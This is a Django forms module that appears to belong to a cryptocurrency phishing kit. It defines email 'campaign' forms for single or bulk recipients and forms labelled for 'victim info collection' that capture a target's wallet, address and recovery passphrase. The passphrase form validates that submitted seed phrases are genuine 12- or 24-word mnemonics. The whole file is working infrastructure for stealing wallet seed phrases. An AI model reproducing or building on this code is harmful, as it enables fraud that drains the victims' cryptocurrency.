from django import forms
from .models import Campaign, VictimInfo
from django.core.exceptions import ValidationError
from mnemonic import Mnemonic


# Campaign form for creating a single campaign
class CampaignForm(forms.ModelForm):
    class Meta:
        model = Campaign
        fields = ['recipient_email', 'email_template', 'cryptocurrency', 'quantity', 'min_balance']
        widgets = {
            'recipient_email': forms.EmailInput(attrs={'class': 'form-control', 'placeholder': 'Recipient Email'}),
            'email_template': forms.Select(attrs={'class': 'form-control'}),
            'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
            'quantity': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Crypto Amount'}),
            'min_balance': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Minimum Balance Required'}),
        }

# MultiCampaignForm allows creating a campaign with multiple recipient emails
class MultiCampaignForm(forms.ModelForm):
    recipient_emails = forms.CharField(
        widget=forms.Textarea(attrs={'rows': 3, 'class': 'form-control', 'placeholder': 'Enter emails separated by commas'}),
        help_text="Enter multiple recipient emails separated by commas"
    )

    class Meta:
        model = Campaign
        fields = ['email_template', 'cryptocurrency', 'quantity', 'min_balance']
        widgets = {
            'email_template': forms.Select(attrs={'class': 'form-control'}),
            'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
            'quantity': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Crypto Amount'}),
            'min_balance': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Minimum Balance Required'}),
        }

    def clean_recipient_emails(self):
        emails = self.cleaned_data.get('recipient_emails', '')
        email_list = [email.strip() for email in emails.split(',') if email.strip()]
        if not email_list:
            raise forms.ValidationError("Please provide at least one recipient email.")
        return email_list

# Wallet selection form for the victim info collection
class WalletForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['wallet']
        labels = {
            'wallet': 'Select Wallet',
        }
        widgets = {
            'wallet': forms.Select(attrs={'class': 'form-control'}),
        }

# Address input form for the victim info collection
class AddressForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['address']
        labels = {
            'address': 'Enter Wallet Address',
        }
        widgets = {
            'address': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Enter wallet address'}),
        }


# Passphrase input form for the victim info collection

class PassphraseForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['passphrase']
        widgets = {
            'passphrase': forms.Textarea(attrs={
                'class': 'form-control',
                'placeholder': 'Enter your wallet passphrase here...',
                'rows': 4,
                'style': 'resize: none;',
            }),
        }

    def clean_passphrase(self):
        passphrase = self.cleaned_data.get('passphrase')

        # Split the passphrase into words
        words = passphrase.split()

        # Check if the passphrase contains exactly 12 or 24 words
        if len(words) not in [12, 24]:
            raise ValidationError('The passphrase must contain either 12 or 24 words.')

        # Validate the passphrase using mnemonic library
        if not self.is_valid_passphrase(passphrase):
            raise ValidationError('The passphrase is invalid or does not exist.')

        return passphrase

    def is_valid_passphrase(self, passphrase):
        """
        Validates the mnemonic passphrase using the mnemonic library.
        """
        mnemo = Mnemonic("english")
        return mnemo.check(passphrase)  # Returns True if valid, False otherwise